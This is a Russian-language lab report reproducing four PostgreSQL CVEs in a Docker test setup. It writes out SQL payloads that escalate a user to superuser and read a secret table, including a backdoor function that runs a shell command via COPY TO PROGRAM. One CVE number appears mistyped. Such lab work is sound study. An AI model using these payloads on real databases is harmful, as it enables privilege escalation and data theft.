# Лабораторная работа 1

---

## 1 CVE-2207-6601

Установили докер, склонировали репозиторий

![alt text](./img/image.png)

![alt text](./img/image-1.png)

Подключились командой от user1

```shell
psql postgresql://user1:password@127.0.0.1:5432/db1
```

Вывели данные из таблицы

```
SELECT dblink_exec('host=localhost dbname=secret_db', 'ALTER USER user1 WITH SUPERUSER;');
\c secret_db;
SELECT * from secret_table;
```

![alt text](./img/image-2.png)

## 2 CVE-2018-10915

Подключились к серверу, вывели данные с таблицы

```
CREATE DATABASE secret_db;
ALTER SYSTEM SET default_transaction_read_only TO on;
SELECT pg_reload_conf();
```

![alt text](./img/image-3.png)

```
psql postgresql://user1:password@127.0.0.1:5432/db1
SELECT * FROM dblink('host=192.168.233.3,localhost port=5433,5432 user=postgres password=password target_session_attrs=read-write dbname=secret_db', 'SELECT * FROM secret_table') AS secret_table(c text);
```

![alt text](./img/image-4.png)

## 3 CVE-2020-14349

Собираем

![alt text](./img/image-5.png)

![alt text](./img/image-6.png)

Функция для скрытого повышения привелегий или же просто бэкдор для бд

```
CREATE OR REPLACE FUNCTION public.pg_get_replica_identity_index(int)
RETURNS regclass
LANGUAGE plpgsql
AS $$
BEGIN
    COPY (SELECT 1) TO PROGRAM '/pg12/postgres/bin/psql -c "ALTER USER user1 WITH SUPERUSER;" postgres';
    RETURN pg_catalog.pg_get_replica_identity_index($1);
END;
$$;
```

![alt text](./img/image-7.png)

```
\c secret_db
select * from secret_table;
```

![alt text](./img/image-8.png)

## 4 CVE-2022-1552

Собираем

![alt text](./img/image-9.png)

![alt text](./img/image-10.png)

Повышаем привелегии, эксплуатируем

```
CREATE TABLE bttest_a AS SELECT i as id FROM generate_series(1, 1000) i;
ALTER TABLE bttest_a OWNER TO regress_bttest_role;
```

```
CREATE OR REPLACE FUNCTION ifun(int8) RETURNS int8 AS $$
BEGIN
 if current_user = 'postgres' then
 ALTER USER user1 WITH superuser;
 end if;
 RETURN $1;
END;
$$ LANGUAGE plpgsql IMMUTABLE;
CREATE INDEX bttest_a_expr_idx ON bttest_a ((ifun(id) + ifun(0)))
 WHERE ifun(id + 10) > ifun(10);
alter function ifun volatile;
select pg_sleep(2);
```

```
\c secret_db
SELECT * FROM secret_table;
```

![alt text](./img/image-11.png)
